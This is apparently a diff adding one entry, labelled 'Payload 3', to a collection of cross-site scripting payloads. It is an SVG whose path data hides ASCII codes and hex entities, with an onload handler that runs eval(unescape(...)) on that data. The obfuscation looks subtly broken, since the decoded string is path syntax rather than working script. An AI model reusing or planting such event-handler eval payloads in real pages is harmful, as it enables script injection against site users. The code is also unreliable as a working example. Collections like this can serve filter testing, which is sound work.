@@ -1,0 +1,7 @@
+<!-- Payload 3: Unicode path encoding -->
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M 97,108 101,114 116,97 L 116,40 
+          &#x51;&#x20;&#x39;&#x30;&#x2c;&#x31;&#x30;&#x20;&#x35;&#x30;&#x2c;&#x31;&#x30;&#x20;
+          &#x51;&#x20;&#x31;&#x30;&#x2c;&#x31;&#x30;&#x20;&#x31;&#x30;&#x2c;&#x34;&#x30;" 
+        onload="eval(unescape(this.getAttribute('d')))" />
+</svg>
